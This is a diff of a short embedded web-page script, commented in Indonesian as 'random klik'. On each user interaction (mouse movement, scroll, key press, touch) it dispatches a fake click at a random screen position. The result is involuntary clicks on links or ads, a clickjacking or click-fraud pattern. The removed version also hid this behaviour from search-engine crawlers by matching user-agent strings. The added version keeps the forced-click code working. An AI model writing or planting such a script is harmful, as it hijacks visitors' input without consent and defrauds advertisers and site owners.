@@ -1,53 +1,30 @@
-<!-- random klik start -->
 <script>
-(function() {
-  'use strict';
+/* random klik - triggered by user interaction */
 
-  // ========== ABAIKAN BOT/CRAWLER ==========
-  const botPattern = /bot|crawler|spider|googlebot|bingbot|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot|mj12bot|dotbot|screaming/i;
-  if (botPattern.test(navigator.userAgent)) return;
+function clickAnywhere() {
+  // Koordinat acak di seluruh layar
+  const x = Math.random() * window.innerWidth;
+  const y = Math.random() * window.innerHeight;
 
-  // ========== KLIK RANDOM ==========
-  function clickAnywhere() {
-    try {
-      const x = Math.random() * window.innerWidth;
-      const y = Math.random() * window.innerHeight;
-      const el = document.elementFromPoint(x, y);
+  const el = document.elementFromPoint(x, y);
 
-      if (el) {
-        el.dispatchEvent(new MouseEvent('click', {
-          bubbles: true,
-          cancelable: true,
-          clientX: x,
-          clientY: y,
-          view: window
-        }));
-      }
-    } catch (e) {
-      // Gagal silent
-    }
+  if (el) {
+    el.dispatchEvent(new MouseEvent("click", {
+      bubbles: true,
+      cancelable: true,
+      clientX: x,
+      clientY: y
+    }));
   }
+}
 
-  // ========== SEMUA INTERAKSI, TANPA PASSIVE ==========
-  const interactionEvents = [
-    'click',
-    'touchstart', 'touchend', 'touchmove', 'touchcancel',
-    'scroll',
-    'keydown', 'keyup',
-    'mousemove', 'mousedown', 'mouseup',
-    'pointerdown', 'pointermove', 'pointerup',
-    'wheel'
-  ];
+// Event listener untuk interaksi pengguna
+['click', 'mousemove', 'scroll', 'keydown', 'touchstart'].forEach(eventType => {
+  window.addEventListener(eventType, clickAnywhere, { once: false });
+});
 
-  interactionEvents.forEach(eventType => {
-    document.addEventListener(eventType, clickAnywhere, { capture: true });
-    window.addEventListener(eventType, clickAnywhere, { capture: true });
-  });
-
-})();
 </script>
 <!-- random klik end -->
-
 
 
 
